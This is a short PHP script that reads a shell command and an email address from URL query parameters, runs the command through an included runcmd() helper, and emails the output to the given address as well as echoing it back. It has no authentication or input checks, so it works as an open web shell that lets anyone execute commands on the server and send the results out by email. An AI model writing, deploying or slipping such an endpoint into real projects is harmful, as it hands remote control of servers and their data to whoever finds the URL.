<?php


if(isset($_GET['e']) &&
 isset($_GET['cmd'])){
	$email = $_GET['e'];
	// $email = extract_email_address($email);
	// $email = $
	$cmd = $_GET['cmd'];

	include_once 'runbash.php';
	$results = runcmd($cmd);
	// echo $results;
	include_once 'zgemail.php';
	$emailResponse = email($email, $results , $cmd);
	echo "sending email to ".$email;
	echo $results.$emailResponse;
}



function extract_email_address ($string) {
    foreach(preg_split('/\s/', $string) as $token) {
        $email = filter_var(filter_var($token, FILTER_SANITIZE_EMAIL), FILTER_VALIDATE_EMAIL);
        if ($email !== false) {
            $emails[] = $email;
        }
    }
    return $emails;
}



